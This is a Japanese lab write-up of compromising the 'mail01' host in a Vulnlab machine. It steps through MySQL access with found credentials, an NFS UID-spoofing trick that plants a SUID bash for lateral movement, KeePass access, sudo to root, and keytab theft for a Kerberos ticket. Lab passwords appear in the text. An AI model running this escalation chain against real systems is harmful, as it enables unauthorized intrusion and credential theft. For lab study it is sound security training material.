www-data@mail01:/$ ss -tulnp
ss -tulnp
Netid State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess                                               
udp   UNCONN 0      0                 0.0.0.0:39086      0.0.0.0:*                                                         
udp   UNCONN 0      0                 0.0.0.0:35242      0.0.0.0:*                                                         
udp   UNCONN 0      0                 0.0.0.0:57968      0.0.0.0:*                                                         
udp   UNCONN 0      0               127.0.0.1:804        0.0.0.0:*                                                         
udp   UNCONN 0      0                 0.0.0.0:60325      0.0.0.0:*                                                         
udp   UNCONN 0      0                 0.0.0.0:40883      0.0.0.0:*                                                         
udp   UNCONN 0      0           127.0.0.53%lo:53         0.0.0.0:*                                                         
udp   UNCONN 0      0      10.10.169.150%ens5:68         0.0.0.0:*                                                         
udp   UNCONN 0      0                 0.0.0.0:111        0.0.0.0:*                                                         
udp   UNCONN 0      0                    [::]:39487         [::]:*                                                         
udp   UNCONN 0      0                    [::]:37567         [::]:*                                                         
udp   UNCONN 0      0                    [::]:60159         [::]:*                                                         
udp   UNCONN 0      0                    [::]:36643         [::]:*                                                         
udp   UNCONN 0      0                    [::]:111           [::]:*                                                         
udp   UNCONN 0      0                    [::]:44169         [::]:*                                                         
tcp   LISTEN 0      100               0.0.0.0:110        0.0.0.0:*                                                         
tcp   LISTEN 0      100               0.0.0.0:143        0.0.0.0:*                                                         
tcp   LISTEN 0      4096              0.0.0.0:111        0.0.0.0:*                                                         
tcp   LISTEN 0      511               0.0.0.0:80         0.0.0.0:*    users:(("nginx",pid=756,fd=8),("nginx",pid=755,fd=8))
tcp   LISTEN 0      64                0.0.0.0:46611      0.0.0.0:*                                                         
tcp   LISTEN 0      4096              0.0.0.0:48245      0.0.0.0:*                                                         
tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*                                                         
tcp   LISTEN 0      128               0.0.0.0:22         0.0.0.0:*                                                         
tcp   LISTEN 0      4096              0.0.0.0:45335      0.0.0.0:*                                                         
tcp   LISTEN 0      100               0.0.0.0:25         0.0.0.0:*                                                         
tcp   LISTEN 0      100               0.0.0.0:993        0.0.0.0:*                                                         
tcp   LISTEN 0      64                0.0.0.0:2049       0.0.0.0:*                                                         
tcp   LISTEN 0      100               0.0.0.0:995        0.0.0.0:*                                                         
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*                                                         
tcp   LISTEN 0      4096              0.0.0.0:59241      0.0.0.0:*                                                         
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*                                                         
tcp   LISTEN 0      100               0.0.0.0:587        0.0.0.0:*                                                         
tcp   LISTEN 0      4096              0.0.0.0:56397      0.0.0.0:*                                                         
tcp   LISTEN 0      100                  [::]:110           [::]:*                                                         
tcp   LISTEN 0      100                  [::]:143           [::]:*                                                         
tcp   LISTEN 0      4096                 [::]:111           [::]:*                                                         
tcp   LISTEN 0      511                  [::]:80            [::]:*    users:(("nginx",pid=756,fd=9),("nginx",pid=755,fd=9))
tcp   LISTEN 0      128                  [::]:22            [::]:*                                                         
tcp   LISTEN 0      4096                 [::]:39543         [::]:*                                                         
tcp   LISTEN 0      64                   [::]:45497         [::]:*                                                         
tcp   LISTEN 0      100                  [::]:25            [::]:*                                                         
tcp   LISTEN 0      4096                 [::]:50811         [::]:*                                                         
tcp   LISTEN 0      100                  [::]:993           [::]:*                                                         
tcp   LISTEN 0      64                   [::]:2049          [::]:*                                                         
tcp   LISTEN 0      4096                 [::]:59201         [::]:*                                                         
tcp   LISTEN 0      100                  [::]:995           [::]:*                                                         
tcp   LISTEN 0      4096                 [::]:50659         [::]:*                                                         
tcp   LISTEN 0      100                  [::]:587           [::]:*        
```
動いてる
ローカルからだったら、アクセスできそう
　　
認証情報を使って、アクセスしてみる
```sh
mysql -u roundcube -p'Duckling21'
```
これだと、ちょっとうまく行かないので、行うコマンドを指定する

```sh
www-data@mail01:/$ mysql -u roundcube -p'Duckling21' -e "show databases;"
mysql -u roundcube -p'Duckling21' -e "show databases;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| roundcubemail      |
+--------------------+
```
アクセスできたことが確認できる

ユーザーのパスワードなどを知りたいけど、これって一番上で取得したのと同じかな(そんな気がしてきた)
```sh
www-data@mail01:/$ mysql -u roundcube -p'Duckling21' roundcubemail -e "show tables;"
<cube -p'Duckling21' roundcubemail -e "show tables;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+-------------------------+
| Tables_in_roundcubemail |
+-------------------------+
| cache                   |
| cache_index             |
| cache_messages          |
| cache_shared            |
| cache_thread            |
| collected_addresses     |
| contactgroupmembers     |
| contactgroups           |
| contacts                |
| dictionary              |
| filestore               |
| identities              |
| responses               |
| searches                |
| session                 |
| system                  |
| users                   |
+-------------------------+
www-data@mail01:/$ mysql -u roundcube -p'Duckling21' roundcubemail -e "SELECT * FROM users;"
<Duckling21' roundcubemail -e "SELECT * FROM users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+---------+------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+-------------------------------------------------------------------------------------------------+
| user_id | username               | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                                                                     |
+---------+------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+-------------------------------------------------------------------------------------------------+
|       1 | admin@hybrid.vl        | localhost | 2023-06-17 13:56:16 | 2025-10-14 04:45:10 | NULL         |                 NULL | en_US    | a:2:{s:17:"message_threading";a:1:{s:4:"Junk";b:0;}s:11:"client_hash";s:16:"Aw8V1guBgRHceLJl";} |
|       2 | peter.turner@hybrid.vl | localhost | 2023-06-18 08:42:53 | 2023-06-18 08:42:53 | NULL         |                 NULL | en_US    | a:2:{s:17:"message_threading";a:1:{s:4:"Junk";b:0;}s:11:"client_hash";s:16:"sGrxgKoYhcl2pvWC";} |
+---------+------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+-------------------------------------------------------------------------------------------------+
www-data@mail01:/$ 
```
パスワードハッシュはusersテーブルにはないらしい
他のテーブル見ても特に有用な情報がない



## CVE-2023-22809(失敗)
sudo -V
```bash
www-data@mail01:/$ sudo -V
sudo -V
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9

```
sudo.のバージョンが、1.9.9なので、パッチが当たってなかったら、CVE-2023-22809の脆弱性があるかもしれない

PoC : https://github.com/Toothless5143/CVE-2023-22809
```sh
www-data@mail01:/var/www/roundcube$ python3 CVE-2023-22809.py
python3 CVE-2023-22809.py
 ___  _  _  ____     ___   ___  ___   ___      ___   ___   ___   ___   ___                                                             
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ ) ___(__ \ (__ \ ( _ ) / _ \ / _ ( (__  \  /  )__)(___)/ _/( (_) )/ _/  (_ \(___)/ _/  / _/ / _ \( (_) )\_  /                                                                                                                         
 \___)  \/  (____)   (____)\___/(____)(___/    (____)(____)\___/ \___/  (_/                                                             
CVE-2023-22809   By: Toothless5143
> Currently installed sudo version is not vulnerable
```
使えなさそう、理由としては`sudoers`ファイルで`SETENV`オプションが有効になっている必要があるが、その条件を満たしてないのかも



suidの列挙
```sh
ww-data@mail01:/var/www/roundcube$ find / -type f -perm -04000 -ls 2>/dev/null
<ndcube$ find / -type f -perm -04000 -ls 2>/dev/null
      821     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1891/usr/bin/chfn
      827     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1891/usr/bin/chsh
      896     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1891/usr/bin/gpasswd
      980     55 -rwsr-xr-x   1 root     root        55528 Feb  7  2022 /snap/core20/1891/usr/bin/mount
      989     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1891/usr/bin/newgrp
     1004     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1891/usr/bin/passwd
     1114     67 -rwsr-xr-x   1 root     root        67816 Feb  7  2022 /snap/core20/1891/usr/bin/su
     1115    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1891/usr/bin/sudo
     1173     39 -rwsr-xr-x   1 root     root        39144 Feb  7  2022 /snap/core20/1891/usr/bin/umount
     1262     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1634    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1891/usr/lib/openssh/ssh-keysign
      815     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1822/usr/bin/chfn
      821     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1822/usr/bin/chsh
      890     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1822/usr/bin/gpasswd
      974     55 -rwsr-xr-x   1 root     root               55528 Feb  7  2022 /snap/core20/1822/usr/bin/mount
      983     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1822/usr/bin/newgrp
      998     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1822/usr/bin/passwd
     1108     67 -rwsr-xr-x   1 root     root               67816 Feb  7  2022 /snap/core20/1822/usr/bin/su
     1109    163 -rwsr-xr-x   1 root     root              166056 Jan 16  2023 /snap/core20/1822/usr/bin/sudo
     1167     39 -rwsr-xr-x   1 root     root               39144 Feb  7  2022 /snap/core20/1822/usr/bin/umount
     1256     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1628    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1822/usr/lib/openssh/ssh-keysign
      297    129 -rwsr-xr-x   1 root     root              131832 May 12  2023 /snap/snapd/19361/usr/lib/snapd/snap-confine
      139    121 -rwsr-xr-x   1 root     root              123560 Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine
   146175     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
   201781    100 -rwsr-xr-x   1 root     root              101048 Oct 20  2022 /usr/sbin/mount.nfs
   133342     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
   133388     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
   133410     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
   144418    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
   133623     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
   133085     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
   133209     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
   133079     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
   133699     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
   133193     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
   133354     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
   134115    332 -rwsr-xr-x   1 root     root              338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
   133921     36 -rwsr-xr--   1 root     messagebus         35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   146774    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine

```

## NFSへの書き込み

NFSへの書き込みから横展開を行うまでの流れ
1. **NFSはUIDのみで判断** → ローカルで同じUIDを作れば、NFSは「本物のpeter.turner」だと思う
2. **SUIDビット（+s）** → このファイルを実行すると、**ファイル所有者の権限**で動く
3. **`-p`オプション** → 権限を維持したままbashを起動

**結果：** `peter.turner@hybrid.vl`の権限でシェルが取得できる！

### ターゲット側
そもそも`peter.turner@hybrid.vl`がユーザーとして存在しているのかを確認
```sh
www-data@mail01:/opt/share$ id peter.turner@hybrid.vl
id peter.turner@hybrid.vl
uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)
```
ユーザーとしては確認できる
また、ユーザーIDは、902601104であることが確認できる

### 攻撃者側
攻撃者側で、ユーザーIDを`peter.turner@hybrid.vl`のものとして、ユーザーの追加を行う
```sh
┌──(kali㉿kali)-[~/…/Hybrid/target-NFS/opt/share]
└─$ sudo useradd --badname peter.turner@hybrid.vl -u 902601108
useradd: WARNING: --badname is deprecated and will be removed
useradd warning: peter.turner@hybrid.vl's uid 902601108 outside of the UID_MIN 1000 and UID_MAX 60000 range.
```

追加できたかを確かめる
```sh
┌──(kali㉿kali)-[~/…/Hybrid/target-NFS/opt/share]
└─$ getent passwd | grep 902601108
peter.turner@hybrid.vl:x:902601108:1001::/home/peter.turner@hybrid.vl:/bin/sh
```
追加できた

NFSをマウントする。この時、nosuidを付与しないようにする
- nosuiオプションがついていると、以下の攻撃でSUIDをつけたファイルをNFSにコピーしたときに、SUIDが消えてしまう
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ sudo mount -t nfs -o vers=3,nolock,suid 10.10.159.54:/opt/share /tmp/nfs_mount

┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ mount | grep nfs_mount
10.10.159.54:/opt/share on /tmp/nfs_mount type nfs (rw,relatime,vers=3,rsize=262144,wsize=262144,namlen=255,hard,nolock,proto=tcp,timeo=600,retrans=2,sec=sys,mountaddr=10.10.159.54,mountvers=3,mountport=33402,mountproto=udp,local_lock=all,addr=10.10.159.54)
```
~~nosuidがないので、大丈夫そう~~
- アップロードした時に、SUIDビットが消えるので、ターミナルで後から付与する

bashを`peter.turner@hybrid.vl`の権限で、コピーする
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ sudo su -l peter.turner@hybrid.vl
$ cd /tmp/nfs_mount
$ cp bash /tmp/exploit_bash
$ exit
```
コピーできた

SUIDをつける
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ sudo chmod +s /tmp/exploit_bash
                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ ls -la /tmp/exploit_bash
-rwsr-sr-x 1 peter.turner@hybrid.vl peter.turner@hybrid.vl 1396520 Oct 14 07:02 /tmp/exploit_bash

```

`peter.turner@hybrid.vl`で、NFSに元からあったbashを消して、アップロードする
```sh

┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ sudo su -l peter.turner@hybrid.vl
su: warning: cannot change directory to /home/peter.turner@hybrid.vl: No such file or directory
$ cd /tmp/nfs_mount     
$ rm -f bash exploit_bash
$ cp /tmp/exploit_bash bash
$ ls -la bash
-rwxr-xr-x 1 peter.turner@hybrid.vl peter.turner@hybrid.vl 1396520 Oct 14 07:09 bash
```
上で、SUIDを付与したのにも関わらず、消えていることがわかる

なので、コマンドの中で、SUIDを設定する
```sh
$ chmod +s bash            
$ ls -la
total 1380
drwxrwxrwx  2 nobody                 nogroup                   4096 Oct 14 07:09 .
drwxrwxrwt 16 root                   root                       440 Oct 14 07:09 ..
-rw-r--r--  1 root                   root                      6003 Jun 18  2023 backup.tar.gz
-rwsr-sr-x  1 peter.turner@hybrid.vl peter.turner@hybrid.vl 1396520 Oct 14 07:09 bash
-rw-rw-r--  1 kali                   kali                         5 Oct 14 06:38 test.txt
```
これで、SUIDを設定できたことがわかった

### ターゲットホスト
SUIDを設定できたbashを実行する
- `-p`オプション　: privilegedモード。これで[peter.turner@hybrid.vl](mailto:peter.turner@hybrid.vl)の権限でシェルが取得できる
```sh
www-data@mail01:/opt/share$ /opt/share/bash -p
/opt/share/bash -p
bash-5.1$ id
id
uid=33(www-data) gid=33(www-data) euid=902601108(peter.turner@hybrid.vl) egid=1001 groups=1001,33(www-data)
```
uidは、www-data(実際のユーザー)のものだが、euid(Effective User ID : 有効なユーザー)は、`peter.turner@hybrid.vl`のものになっている。
**ファイルアクセスの権限チェックは、euidで判断される**
そのため、このシェルで`peter.turner@hybrid.vl`のファイル権限にアクセスできるということ

`/home/peter.turner@hybrid.vl`にアクセスする
```
bash-5.1$ ls -la /home/peter.turner@hybrid.vl
ls -la /home/peter.turner@hybrid.vl
total 36
drwx------ 4 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Jun 18  2023 .
drwxr-xr-x 3 root                   root                   4096 Jun 17  2023 ..
lrwxrwxrwx 1 peter.turner@hybrid.vl domain users@hybrid.vl    9 Jun 17  2023 .bash_history -> /dev/null
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl  220 Jun 17  2023 .bash_logout
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl 3771 Jun 17  2023 .bashrc
drwx------ 2 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Jun 17  2023 .cache
lrwxrwxrwx 1 peter.turner@hybrid.vl domain users@hybrid.vl    9 Jun 18  2023 .kpcli-history -> /dev/null
drwxr-xr-x 3 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Jun 17  2023 .local
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl  807 Jun 17  2023 .profile
-rw-r--r-- 1 peter.turner@hybrid.vl domain users@hybrid.vl   37 Jun 17  2023 flag.txt
-rw-r--r-- 1 peter.turner@hybrid.vl domain users@hybrid.vl 1678 Jun 18  2023 passwords.kdbx
```
flag.txtを見つけた！！あと、passwords.kdbxがかなり気になる
「kdbx : KeePassなどのパスワードマネージャーで使用される暗号化されたデータベースファイル形式の拡張子」なので、攻撃者の方に送信してみる

パスワードを求められるので、「PeterIstToll!」を試すと、開くことができた
![](https://i.imgur.com/BYt0m0k.png)
hybrid.vl以外には、特になにも情報がなく、hybrid.vl内のmailのパスワードは「PeterIstToll!」だが、domainで新しい認証情報を見つけた

### peter.turnerのドメインの認証情報
peter.turner : b0cwR+G4Dzl_rw

### SSHログイン
mail01に対して、peter.turner@hybrid.vlアカウントでログインできた
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ ssh peter.turner@hybrid.vl@10.10.206.38
(peter.turner@hybrid.vl@10.10.206.38) Password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct 16 03:05:48 AM UTC 2025

  System load:  0.0               Processes:             144
  Usage of /:   65.1% of 6.06GB   Users logged in:       0
  Memory usage: 31%               IPv4 address for ens5: 10.10.206.38
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Jul 30 08:53:36 2023 from 10.10.1.254
peter.turner@hybrid.vl@mail01:~$ 

```

## DCで探索する
[[Vulnlab/Hybrid/DC#peter.turnerでログイン]]に移行する

# Privilege Escalation
なんか、peterアカウントでDCアカウントを探索した結果、普通に証明書が脆弱だけど、マシンアカウントを作成できないから、まずはmail01で管理者になって、mail01のアカウントでDCのAdministratorのアカウントのESC1チケットを取得することにする

## SSHでログインする
そういえば、sudoってどうなってるんだろう
```sh
peter.turner@hybrid.vl@mail01:~$ sudo -l
[sudo] password for peter.turner@hybrid.vl: 
Matching Defaults entries for peter.turner@hybrid.vl on mail01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User peter.turner@hybrid.vl may run the following commands on mail01:
    (ALL) ALL

```
え！全部のコマンドsudo権限実行できるじゃん！！

じゃあ、管理者になれるってこと？！
```sh
peter.turner@hybrid.vl@mail01:~$ sudo su -
root@mail01:~# ls
flag.txt  snap
root@mail01:~# 
```
なれた！

rootのフラグを取得する
```sh
root@mail01:~# cd /root
root@mail01:~# ls
flag.txt  snap
root@mail01:~# cat flag.txt
<SNIP>
```
# Post Privilege Escalation

##  DCのAdministratorのESC1を取得する
ってことは、mail01のマシンアカウント取得できないかな

Kerberos keytabファイルを確認する
```sh
root@mail01:~# find / -name "*.keytab" 2>/dev/null
/etc/krb5.keytab
root@mail01:~# ls -la /etc/krb5.keytab
-rw------- 1 root root 650 Jun 17  2023 /etc/krb5.keytab
```
mail01ではなにもできないので、攻撃者の方に転送する


krb5.keytabの中身を確認する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ klist -k krb5.keytab 
Keytab name: FILE:krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 MAIL01$@HYBRID.VL
   2 MAIL01$@HYBRID.VL
   2 MAIL01$@HYBRID.VL
   2 host/MAIL01@HYBRID.VL
   2 host/MAIL01@HYBRID.VL
   2 host/MAIL01@HYBRID.VL
   2 RestrictedKrbHost/MAIL01@HYBRID.VL
   2 RestrictedKrbHost/MAIL01@HYBRID.VL
   2 RestrictedKrbHost/MAIL01@HYBRID.VL

```

チケット取得を試す
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ cat << EOF | sudo tee /etc/krb5.conf
[libdefaults]
    default_realm = HYBRID.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h

[realms]
    HYBRID.VL = {
        kdc = 10.10.206.37
        admin_server = 10.10.206.37
    }
EOF
[sudo] password for kali: 
[libdefaults]
    default_realm = HYBRID.VL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h

[realms]
    HYBRID.VL = {
        kdc = 10.10.206.37
        admin_server = 10.10.206.37
    }
```

チケットを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ export KRB5CCNAME=/tmp/mail01.ccache
kinit -k -t krb5.keytab 'MAIL01$@HYBRID.VL'

┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ klist                               
Ticket cache: FILE:/tmp/mail01.ccache
Default principal: MAIL01$@HYBRID.VL

Valid starting     Expires            Service principal
10/16/25 03:30:09  10/16/25 13:30:09  krbtgt/HYBRID.VL@HYBRID.VL
        renew until 10/17/25 03:30:08
```
取得できた

[[Vulnlab/Hybrid/DC#CertPy]]に戻る
# Notes
- NFSに書き込み権限があるときは、横展開を行えるかも

